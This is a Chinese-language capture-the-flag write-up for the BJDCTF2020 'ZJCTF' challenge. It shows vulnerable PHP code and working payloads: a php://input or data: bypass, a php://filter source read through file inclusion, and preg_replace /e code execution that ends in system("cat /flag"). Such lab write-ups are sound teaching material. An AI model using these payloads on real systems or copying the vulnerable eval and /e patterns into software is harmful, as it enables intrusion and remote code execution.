# \[BJDCTF2020]ZJCTF，不过如此

## \[BJDCTF2020]ZJCTF，不过如此

## 考点

* 用php://input绕过file\_get\_contents的内容限制
* 文件包含配合伪协议读取文件
* `preg_replace`的`/e`模式可以进行代码执行
* PHP正则表达式`\s`表示只要出现空白就匹配，`\S`表示非空白就匹配，`*`表示匹配任意次

## wp

给了代码

```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php
}
else{
    highlight_file(__FILE__);
}
```

```
POST /?text=php://input&file=php://filter/read=convert.base64-encode/resource=next.php

I have a dream
```

或者是

```
?text=data:text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

得到next.php源码

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

preg\_replace的定义如下

```
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

在`complex()`函数中使用了`preg_replace`的`/e`模式，会把`$replacement`当做php代码来执行，但是本题第二个参数却固定为`'strtolower("\\1")'`字符串

上面的命令执行，相当于 `eval('strtolower("\\1");')` ，其中的 `\\1` 实际上就是 `\1` ，而 `\1` 在正则表达式中有自己的含义。

> 对一个正则表达式模式或部分模式 <mark style="color:orange;">两边添加圆括号</mark> 将导致相关 <mark style="color:orange;">匹配存储到一个临时缓冲区</mark> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

这里的 `\1` 实际上指定的是第一个子匹配项，那么就需要控制正则表达式让它匹配我们的shell。这样在代码执行时就是`eval(strtolower("$shell"));`

payload：`\S*=${phpinfo()}`

<mark style="color:orange;">在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行</mark>，执行后，即变成 `${1}`。

payload：`next.php?\S*=${getFlag()}&cmd=system("cat /flag");`

## 小结

1. [深入研究preg\_replace与代码执行](https://xz.aliyun.com/t/2557)
